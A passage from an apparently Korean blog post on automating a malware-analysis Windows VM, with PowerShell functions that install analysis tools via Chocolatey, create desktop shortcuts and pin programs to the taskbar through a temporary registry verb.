id="Chocolatey&#xB97C;-&#xD65C;&#xC6A9;&#xD55C;-&#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;-&#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;"><a href="#Chocolatey&#xB97C;-&#xD65C;&#xC6A9;&#xD55C;-&#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;-&#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;" class="headerlink" title="Chocolatey&#xB97C; &#xD65C;&#xC6A9;&#xD55C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;"></a>Chocolatey&#xB97C; &#xD65C;&#xC6A9;&#xD55C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;</h1><p>&#xC6B0;&#xB9AC;&#xC5D0;&#xAC90; chocolatey&#xAC00; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xB294; &#xAC71;&#xC815;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD560; &#xD328;&#xD0A4;&#xC9C0; &#xC774;&#xB984;&#xB9CC; &#xC815;&#xD574;&#xC8FC;&#xBA74; &#xC54C;&#xC544;&#xC11C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD574;&#xC904; &#xD14C;&#xB2C8;&#xAE4C;&#xC694;.</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">download_apps</span></span>{    <span class="hljs-comment"># tools list</span>    <span class="hljs-variable">$packages</span> = <span class="hljs-selector-tag">@</span>(        <span class="hljs-string">&quot;hxd&quot;</span>        <span class="hljs-string">&quot;7zip&quot;</span>        <span class="hljs-string">&quot;ghidra&quot;</span>        <span class="hljs-string">&quot;vscode&quot;</span>        <span class="hljs-string">&quot;procmon&quot;</span>        <span class="hljs-string">&quot;procexp&quot;</span>        <span class="hljs-string">&quot;processhacker&quot;</span>        <span class="hljs-string">&quot;python&quot;</span>        <span class="hljs-string">&quot;die&quot;</span>        <span class="hljs-string">&quot;pestudio&quot;</span>        <span class="hljs-string">&quot;googlechrome&quot;</span>        <span class="hljs-string">&quot;autoruns&quot;</span>        <span class="hljs-string">&quot;wireshark&quot;</span>        <span class="hljs-string">&quot;hashmyfiles&quot;</span>        <span class="hljs-string">&quot;strings&quot;</span>        <span class="hljs-string">&quot;ida-free&quot;</span>    )    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$package</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$packages</span>)    {        choco install <span class="hljs-variable">$package</span> <span class="hljs-literal">-y</span>    }}</code></pre><p><code>$packages</code>&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xD328;&#xD0A4;&#xC9C0;&#xB294; &#xCDE8;&#xD5A5;&#xC5D0; &#xB530;&#xB77C; &#xCD94;&#xAC00;, &#xC81C;&#xAC70;, &#xC218;&#xC815;&#xD558;&#xC154;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xB9E4;&#xC6B0; &#xB9E4;&#xC6B0; &#xAC04;&#xB2E8;&#xD558;&#xC8E0;? &#xC774;&#xC81C; &#xC774; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xC5EC; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%208.png" alt></p><p><code>download_apps</code> &#xD568;&#xC218;&#xB9CC; &#xC2E4;&#xD589;&#xD588;&#xC744; &#xBFD0;&#xC778;&#xB370; &#xC54C;&#xC544;&#xC11C; &#xB2E4; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xBC1B;&#xC544;&#xC8FC;&#xACE0; &#xC788;&#xB124;&#xC694;. &#xD638;&#xD638; &#xAE30;&#xD2B9;&#xD55C; &#xB140;&#xC11D;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xBA74; &#xC774;&#xC81C; &#xC124;&#xCE58;&#xB41C; &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xC785;&#xB9DB;&#xC5D0; &#xB530;&#xB77C; &#xBC14;&#xD0D5;&#xD654;&#xBA74; &#xBC14;&#xB85C;&#xAC00;&#xAE30;, &#xC791;&#xC5C5; &#xD45C;&#xC2DC;&#xC904; &#xACE0;&#xC815;&#xC744; &#xD574;&#xC918;&#xC57C;&#xACA0;&#xC8E0;?</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%209.png" alt></p><blockquote><p><del>&#xC544; &#xBC8C;&#xC368; &#xADC0;&#xCC2E;&#xB2E4;.. &#xADF8;&#xB0E5; &#xCE68;&#xB300;&#xC5D0; &#xB204;&#xC6CC;&#xC11C; &#xC26C;&#xACE0; &#xC2F6;&#xB2E4;&#x2026;</del></p></blockquote><h1 id="&#xBC14;&#xD0D5;&#xD654;&#xBA74;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;-&#xB9CC;&#xB4E4;&#xAE30;"><a href="#&#xBC14;&#xD0D5;&#xD654;&#xBA74;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;-&#xB9CC;&#xB4E4;&#xAE30;" class="headerlink" title="&#xBC14;&#xD0D5;&#xD654;&#xBA74; &#xBC14;&#xB85C;&#xAC00;&#xAE30; &#xB9CC;&#xB4E4;&#xAE30;"></a>&#xBC14;&#xD0D5;&#xD654;&#xBA74; &#xBC14;&#xB85C;&#xAC00;&#xAE30; &#xB9CC;&#xB4E4;&#xAE30;</h1><p>Powershell &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xBC14;&#xD0D5;&#xD654;&#xBA74; &#xBC14;&#xB85C;&#xAC00;&#xAE30;&#xB97C; &#xB9CC;&#xB4DC;&#xB294; &#xC791;&#xC5C5;&#xC740; &#xB9E4;&#xC6B0; &#xAC04;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;. WScript&#xB97C; &#xD1B5;&#xD574; CreateShortcut&#xB9CC; &#xD574;&#xC8FC;&#xBA74; &#xB3FC;&#xC694;!</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create_desktop_shortcut</span></span>{    <span class="hljs-keyword">param</span> (        [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$src</span>,        [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$filename</span>    )        <span class="hljs-variable">$dst</span> = <span class="hljs-built_in">Join-Path</span> <span class="hljs-variable">$env:userprofile</span> <span class="hljs-string">&quot;Desktop\<span class="hljs-variable">$filename</span>.lnk&quot;</span>    <span class="hljs-variable">$shell</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-ComObject</span> WScript.Shell    <span class="hljs-variable">$shortcut</span> = <span class="hljs-variable">$shell</span>.CreateShortcut(<span class="hljs-variable">$dst</span>)    <span class="hljs-variable">$shortcut</span>.TargetPath = <span class="hljs-variable">$src</span>    <span class="hljs-variable">$shortcut</span>.Save()}</code></pre><p><code>$src</code>&#xB294; &#xBC14;&#xB85C;&#xAC00;&#xAE30;&#xB97C; &#xB9CC;&#xB4E4; &#xD30C;&#xC77C;&#xC758; &#xACBD;&#xB85C;, <code>$filename</code>&#xC740; &#xBC14;&#xB85C;&#xAC00;&#xAE30;&#xB85C; &#xC0DD;&#xC131;&#xB420; &#xD30C;&#xC77C; &#xC774;&#xB984;&#xC785;&#xB2C8;&#xB2E4;. &#xBC14;&#xD0D5;&#xD654;&#xBA74;&#xC5D0; &#xC0DD;&#xC131;&#xD560; &#xAC83;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>$dst</code>&#xB294; &#xBC14;&#xD0D5;&#xD654;&#xBA74;&#xC73C;&#xB85C; &#xACE0;&#xC815;&#xC774; &#xB418;&#xC5B4;&#xC788;&#xC9C0;&#xB9CC;, &#xB2E4;&#xB978; &#xACF3;&#xC5D0; &#xB9CC;&#xB4DC;&#xB294; &#xAC78; &#xC120;&#xD638;&#xD55C;&#xB2E4;! &#xD558;&#xC2DC;&#xBA74; &#xC218;&#xC815;&#xD558;&#xC154;&#xB3C4; &#xB418;&#xACE0; <code>$dst</code> &#xC790;&#xCCB4;&#xB97C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xBC1B;&#xC73C;&#xC154;&#xB3C4; &#xC0C1;&#xAD00;&#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. :)</p><p>&#xC694;&#xB85C;&#xCF54;&#xB86C; &#xD574;&#xC8FC;&#xBA74; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xBC14;&#xD0D5;&#xD654;&#xBA74; &#xBC14;&#xB85C;&#xAC00;&#xAE30;&#xB3C4; &#xC0DD;&#xC131; &#xAC00;&#xB2A5;!</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2010.png" alt></p><p>&#xBB50;&#xC57C;&#x2026; &#xC774; &#xBD80;&#xBD84;&#xC740; &#xB108;&#xBB34; &#xC27D;&#xC796;&#xC544;? &#xC791;&#xC5C5; &#xD45C;&#xC2DC;&#xC904; &#xACE0;&#xC815;&#xB3C4; &#xB2E8;&#xC228;&#xC5D0; &#xD574;&#xCE58;&#xC6CC; &#xBC84;&#xB824;&#xC57C;&#xACA0;&#xAD70;&#x2026;</p><h1 id="&#xC791;&#xC5C5;-&#xD45C;&#xC2DC;&#xC904;-&#xACE0;&#xC815;&#xD558;&#xAE30;"><a href="#&#xC791;&#xC5C5;-&#xD45C;&#xC2DC;&#xC904;-&#xACE0;&#xC815;&#xD558;&#xAE30;" class="headerlink" title="&#xC791;&#xC5C5; &#xD45C;&#xC2DC;&#xC904; &#xACE0;&#xC815;&#xD558;&#xAE30;"></a>&#xC791;&#xC5C5; &#xD45C;&#xC2DC;&#xC904; &#xACE0;&#xC815;&#xD558;&#xAE30;</h1><p>&#xBC14;&#xD0D5;&#xD654;&#xBA74; &#xBC14;&#xB85C;&#xAC00;&#xAE30;&#xB294; &#xB9E4;&#xC6B0; &#xB9E4;&#xC6B0; &#xB2E8;&#xC21C;&#xD588;&#xC8E0;? &#xC791;&#xC5C5; &#xD45C;&#xC2DC;&#xC904; &#xACE0;&#xC815;&#xD558;&#xB294; &#xAC83;&#xB3C4; &#xB9E4;&#xC6B0; &#xB9E4;&#xC6B0; &#xB2E8;&#xC21C;&#xD569;&#xB2C8;&#xB2E4;! 3&#xC904;&#xC774;&#xBA74; &#xB3FC;&#xC694;!</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pin_taskbar</span></span>{    <span class="hljs-keyword">param</span> (        [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$src</span>    )    <span class="hljs-variable">$shell</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-ComObject</span> <span class="hljs-string">&quot;Shell.Application&quot;</span>    <span class="hljs-variable">$pin</span> = <span class="hljs-variable">$shell</span>.NameSpace((<span class="hljs-built_in">Get-Item</span> <span class="hljs-variable">$src</span>).DirectoryName).ParseName((<span class="hljs-built_in">Get-Item</span> <span class="hljs-variable">$src</span>).Name)    <span class="hljs-variable">$pin</span>.InvokeVerb(<span class="hljs-string">&quot;taskbarpin&quot;</span>)}</code></pre><p>&#xC790; &#xC774;&#xC81C; &#xC774;&#xAC78; &#xC2E4;&#xD589;&#xD574;&#xC8FC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;! &#xC544;&#xD558;&#xD558; &#xB108;&#xBB34; &#xC27D;&#xB2E4;!</p><p>.</p><p>.</p><p>.</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2011.png" alt></p><p>&#xB180;&#xB77C;&#xC6B8; &#xB9CC;&#xD07C; &#xC544;&#xBB34; &#xC77C;&#xB3C4; &#xC77C;&#xC5B4;&#xB098;&#xC9C0; &#xC54A;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC65C;&#xC9C0;??? &#xBB34;&#xC2A8; &#xC77C;&#xC774;&#xC9C0;??? <code>$pin.Verbs()</code>&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xC744; &#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2012.png" alt></p><p>&#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB124;. &#xC791;&#xC5C5; &#xD45C;&#xC2DC;&#xC904;&#xC5D0; &#xACE0;&#xC815;&#xC774; &#xC5C6;&#xC5B4;&#xC694;.</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2013.png" alt></p><p>&#xC5EC;&#xAE30;&#xC5D0;&#xB294; &#xC788;&#xB294;&#xB370; &#xC65C;? &#xC65C; &#xC800;&#xAE30;&#xC5D0;&#xB294; &#xC5C6;&#xB294; &#xAC70;&#xC9C0;&#x2026;??? &#xD558;&#xC9C0;&#xB9CC; &#xC778;&#xC0DD;&#xC5D0; &#xBD88;&#xAC00;&#xB2A5;&#xC740; &#xC5C6;&#xB294; &#xBC95;. &#xC5C6;&#xC73C;&#xBA74; &#xB9CC;&#xB4E4;&#xC5B4;&#xC8FC;&#xBA74; &#xB418;&#xC9C0; &#xC54A;&#xC744;&#xAE4C;&#xC694;?</p><p>&#xC544;&#xB798;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; <code>Verbs()</code>&#xC5D0; Taskbar pin &#xAE30;&#xB2A5;&#xC744; &#xD65C;&#xC131;&#xD654;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs powershell"><span class="hljs-variable">$value_data</span> = (<span class="hljs-built_in">Get-ItemProperty</span>(<span class="hljs-string">&quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\&quot;</span> +    <span class="hljs-string">&quot;Explorer\CommandStore\shell\Windows.taskbarpin&quot;</span>)).ExplorerCommandHandler<span class="hljs-variable">$classes_key</span> = (<span class="hljs-built_in">Get-Item</span> <span class="hljs-string">&quot;HKCU:\SOFTWARE\Classes&quot;</span>).OpenSubKey(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-variable">$true</span>)<span class="hljs-variable">$shell_key</span> = <span class="hljs-variable">$classes_key</span>.CreateSubKey(<span class="hljs-string">&quot;shell&quot;</span>, <span class="hljs-variable">$true</span>)<span class="hljs-variable">$verb_key</span> = <span class="hljs-variable">$shell_key</span>.CreateSubKey(<span class="hljs-string">&quot;taskbarpin&quot;</span>, <span class="hljs-variable">$true</span>)<span class="hljs-variable">$verb_key</span>.SetValue(<span class="hljs-string">&quot;ExplorerCommandHandler&quot;</span>, <span class="hljs-variable">$value_data</span>)</code></pre><p><code>$value_data</code>&#xB294; <code>Windows.taskbarpin</code>&#xC758; <code>ExplorerCommandHandler</code>&#xC758; &#xAC12;&#xC744; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; <code>HKEY_CURRENT_USER</code>&#xC5D0; <code>Classes</code>&#xC5D0; <code>shell</code>&#xACFC; <code>taskbarpin</code>&#xC744; &#xB9CC;&#xB4E4;&#xC5B4;&#xC11C; &#xD574;&#xB2F9; &#xD578;&#xB4E4;&#xB7EC;&#xC758; &#xAC12;&#xC744; &#xCD94;&#xAC00;&#xD574;&#xC8FC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. <code>$pin.verbs()</code>&#xB85C; &#xD655;&#xC778;&#xC744; &#xD574;&#xBCFC;&#xAE4C;&#xC694;?</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2014.png" alt></p><p>taskbarpin&#xC774; &#xCD94;&#xAC00;&#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC774;&#xC81C; <code>$pin.InvokeVerb(&quot;taskbarpin&quot;)</code>&#xC744; &#xD1B5;&#xD574; <code>taskbarpin</code>&#xC744; &#xD638;&#xCD9C;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;. &#xC81C;&#xBC1C; &#xB418;&#xAE30;&#xB97C; &#xBC14;&#xB77C;&#xBA70;!</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2015.png" alt></p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2016.png" alt></p><p>&#xC2E4;&#xD5D8; &#xC0BC;&#xC544; vscode&#xC758; &#xACBD;&#xB85C;&#xB97C; &#xC92C;&#xB294;&#xB370; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xB124;&#xC694;! &#xC774;&#xC81C; &#xC6D0;&#xD558;&#xB294; &#xAC83;&#xB4E4;&#xC744; &#xC791;&#xC5C5; &#xD45C;&#xC2DC;&#xC904;&#xC5D0; &#xCD94;&#xAC00;&#xD574;&#xC8FC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xADF8;&#xC804;&#xC5D0;&#x2026;</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2017.png" alt></p><p>&#xC5EC;&#xAE30;&#xC5D0; &#xC6B0;&#xB9AC;&#xAC00; &#xB9CC;&#xB4E0; <code>taskbarpin</code>&#xC774; &#xB0A8;&#xC544;&#xC788;&#xB124;&#xC694;&#x2026;? &#xC774; &#xB140;&#xC11D;&#xC758; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC;&#xB97C; &#xC9C0;&#xC6CC;&#xC57C;&#xACA0;&#xC5B4;&#xC694;.</p><pre><code class="hljs powershell"><span class="hljs-variable">$shell_key</span>.DeleteSubKey(<span class="hljs-string">&quot;taskbarpin&quot;</span>)<span class="hljs-keyword">if</span>(<span class="hljs-variable">$shell_key</span>.SubKeyCount <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$shell_key</span>.ValueCount <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span>){    <span class="hljs-variable">$classes_key</span>.DeleteSubKey(<span class="hljs-string">&quot;shell&quot;</span>)}</code></pre><p>&#xC9E0;. &#xC774;&#xB807;&#xAC8C; &#xADF8;&#xB0E5; &#xC9C0;&#xC6CC;&#xBC84;&#xB9AC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;!</p><h1 id="&#xC804;&#xCCB4;-&#xCF54;&#xB4DC;"><a href="#&#xC804;&#xCCB4;-&#xCF54;&#xB4DC;" class="headerlink" title="&#xC804;&#xCCB4; &#xCF54;&#xB4DC;"></a>&#xC804;&#xCCB4; &#xCF54;&#xB4DC;</h1><p>&#xC774;&#xC81C; &#xC644;&#xC131;&#xC744; &#xD574;&#xBC84;&#xB838;&#xB124;&#xC694;. <code>application.psm1</code>&#xC758; &#xC804;&#xCCB4; &#xCF54;&#xB4DC;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;!</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">download_apps</span></span>{    <span class="hljs-comment"># tools list</span>    <span class="hljs-variable">$packages</span> = <span class="hljs-selector-tag">@</span>(        <span class="hljs-string">&quot;hxd&quot;</span>        <span class="hljs-string">&quot;7zip&quot;</span>        <span class="hljs-string">&quot;ghidra&quot;</span>        <span class="hljs-string">&quot;vscode&quot;</span>        <span class="hljs-string">&quot;procmon&quot;</span>        <span class="hljs-string">&quot;procexp&quot;</span>        <span class="hljs-string">&quot;processhacker&quot;</span>        <span class="hljs-string">&quot;python&quot;</span>        <span class="hljs-string">&quot;die&quot;</span>        <span class="hljs-string">&quot;pestudio&quot;</span>        <span class="hljs-string">&quot;googlechrome&quot;</span>        <span class="hljs-string">&quot;autoruns&quot;</span>        <span class="hljs-string">&quot;wireshark&quot;</span>        <span class="hljs-string">&quot;hashmyfiles&quot;</span>        <span class="hljs-string">&quot;strings&quot;</span>        <span class="hljs-string">&quot;ida-free&quot;</span>    )    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$package</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$packages</span>)    {        choco install <span class="hljs-variable">$package</span> <span class="hljs-literal">-y</span>    }}<span class="hljs-comment"># refer: https://dotnet-helpers.com/powershell/create-shortcuts-on-desktops-using-powershell/</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create_desktop_shortcut</span></span>{    <span class="hljs-keyword">param</span> (        [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$src</span>,        [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$filename</span>    )        <span class="hljs-variable">$dst</span> = <span class="hljs-built_in">Join-Path</span> <span class="hljs-variable">$env:userprofile</span> <span class="hljs-string">&quot;Desktop\<span class="hljs-variable">$filename</span>.lnk&quot;</span>    <span class="hljs-variable">$shell</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-ComObject</span> WScript.Shell    <span class="hljs-variable">$shortcut</span> = <span class="hljs-variable">$shell</span>.CreateShortcut(<span class="hljs-variable">$dst</span>)    <span class="hljs-variable">$shortcut</span>.TargetPath = <span class="hljs-variable">$src</span>    <span class="hljs-variable">$shortcut</span>.Save()}<span class="hljs-comment"># refer: https://stackoverflow.com/questions/31720595/pin-program-to-taskbar-using-ps-in-windows-10</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pin_taskbar</span></span>{    <span class="hljs-keyword">param</span> (        [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$src</span>    )    <span class="hljs-variable">$value_data</span> = (<span class="hljs-built_in">Get-ItemProperty</span>(<span class="hljs-string">&quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\&quot;</span> +    <span class="hljs-string">&quot;Explorer\CommandStore\shell\Windows.taskbarpin&quot;</span>)).ExplorerCommandHandler    <span class="hljs-variable">$classes_key</span> = (<span class="hljs-built_in">Get-Item</span> <span class="hljs-string">&quot;HKCU:\SOFTWARE\Classes&quot;</span>).OpenSubKey(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-variable">$true</span>)    <span class="hljs-variable">$shell_key</span> = <span class="hljs-variable">$classes_key</span>.CreateSubKey(<span class="hljs-string">&quot;shell&quot;</span>, <span class="hljs-variable">$true</span>)    <span class="hljs-variable">$verb_key</span> = <span class="hljs-variable">$shell_key</span>.CreateSubKey(<span class="hljs-string">&quot;taskbarpin&quot;</span>, <span class="hljs-variable">$true</span>)    <span class="hljs-variable">$verb_key</span>.SetValue(<span class="hljs-string">&quot;ExplorerCommandHandler&quot;</span>, <span class="hljs-variable">$value_data</span>)    <span class="hljs-variable">$shell</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-ComObject</span> <span class="hljs-string">&quot;Shell.Application&quot;</span>    <span class="hljs-variable">$pin</span> = <span class="hljs-variable">$shell</span>.NameSpace((<span class="hljs-built_in">Get-Item</span> <span class="hljs-variable">$src</span>).DirectoryName).ParseName((<span class="hljs-built_in">Get-Item</span> <span class="hljs-variable">$src</span>).Name)    <span class="hljs-variable">$pin</span>.InvokeVerb(<span class="hljs-string">&quot;taskbarpin&quot;</span>)    <span class="hljs-variable">$shell_key</span>.DeleteSubKey(<span class="hljs-string">&quot;taskbarpin&quot;</span>)    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$shell_key</span>.SubKeyCount <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$shell_key</span>.ValueCount <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span>)    {        <span class="hljs-variable">$classes_key</span>.DeleteSubKey(<span class="hljs-string">&quot;shell&quot;</span>)    }}</code></pre><p>&#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xAE30;&#xB2A5;&#xC774; &#xB9CE;&#xC774; &#xC5C6;&#xC8E0;? &#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xAC78;&#xB85C;&#xB3C4; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC790;&#xB3D9;&#xD654; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;! &#xC774;&#xC804;&#xC5D0; &#xB9CC;&#xB4E4;&#xC5C8;&#xB358; <code>install.ps1</code>&#xC5D0; &#xC6D0;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xC744; &#xD574;&#xBD05;&#xC2DC;&#xB2E4;. +_+</p><pre><code class="hljs powershell"><span class="hljs-comment"># download apps</span>download_apps<span class="hljs-comment"># create desktop shortcut</span>create_desktop_shortcut <span class="hljs-string">&quot;C:\Program Files\Wireshark\Wireshark.exe&quot;</span> <span class="hljs-string">&quot;Wireshark&quot;</span><span class="hljs-comment"># pin taskbar</span>pin_taskbar <span class="hljs-string">&quot;C:\ProgramData\chocolatey\lib\procexp\tools\procexp.exe&quot;</span>pin_taskbar <span class="hljs-string">&quot;C:\ProgramData\chocolatey\lib\procexp\tools\procexp64.exe&quot;</span>pin_taskbar <span class="hljs-string">&quot;C:\ProgramData\chocolatey\lib\die\tools\die_win64_portable\die.exe&quot;</span>pin_taskbar <span class="hljs-string">&quot;C:\ProgramData\chocolatey\lib\PeStudio\tools\pestudio\pestudio.exe&quot;</span>pin_taskbar <span class="hljs-string">&quot;C:\Program Files\Microsoft VS Code\Code.exe&quot;</span></code></pre><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2018.png" alt></p><p>&#xC9E0;! &#xC6B0;&#xB9AC;&#xAC00; &#xACE0;&#xB300;&#xD558;&#xB358; &#xAC83;&#xB4E4;&#xC774; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xD558;&#xB098;&#xB85C; &#xB05D;&#xB0AC;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC791;&#xC5C5; &#xD45C;&#xC2DC;&#xC904;&#xC5D0;&#xB3C4; &#xACE0;&#xC815;&#xB418;&#xC5C8;&#xACE0;, Wireshark&#xB3C4; &#xBC14;&#xD0D5;&#xD654;&#xBA74; &#xBC14;&#xB85C;&#xAC00;&#xAE30;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC84C;&#xB124;&#xC694;!</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2019.png" alt></p><p>&#xD558;&#xC597;&#xAC8C; &#xBD88;&#xD0DC;&#xC6CC; &#xBC84;&#xB838;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="&#xB9C8;&#xCE58;&#xBA70;&#x2026;"><a href="#&#xB9C8;&#xCE58;&#xBA70;&#x2026;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;&#x2026;"></a>&#xB9C8;&#xCE58;&#xBA70;&#x2026;</h1><p>&#xAE30;&#xC220;&#xC801;&#xC73C;&#xB85C; &#xC5B4;&#xB824;&#xC6B4; &#xBD80;&#xBD84;&#xB3C4; &#xC544;&#xB2C8;&#xACE0; &#xB2E8;&#xC9C0; &#xCC98;&#xC74C; &#xB9CC;&#xB4E4;&#xACE0; &#xCC3E;&#xC544;&#xBCF4;&#xAE30;&#xAC00; &#xAD49;&#xC7A5;~~~&#xD788; &#xADC0;&#xCC2E;&#xC740; &#xC791;&#xC5C5;&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC2E4;&#xC0C1; &#xAE30;&#xB2A5;&#xB4E4;&#xC740; stack overflow&#xC5D0; &#xB2E4; &#xB098;&#xC640; &#xC788;&#xC5B4;&#xC11C; &#xD604;&#xC7AC; &#xBC84;&#xC804;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xCC3E;&#xAC70;&#xB098; &#xD558;&#xBA74; &#xB418;&#xAC70;&#xB4E0;&#xC694;. &#xD574;&#xB2F9; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB294; <a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/">MSEdge on Win10 (x64) Stable 1809 &#xBC84;&#xC804;</a>&#xC744; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC791;&#xC131;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xC744; &#xD560; &#xB54C; &#xD56D;&#xC0C1; &#xC800;&#xAC78; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xD558;&#xAC70;&#xB4E0;&#xC694; :)</p><p>&#xB530;&#xB77C;&#xC11C; &#xD604;&#xC7AC; OS &#xBC84;&#xC804; 21H1&#xC5D0;&#xC11C;&#xB294; 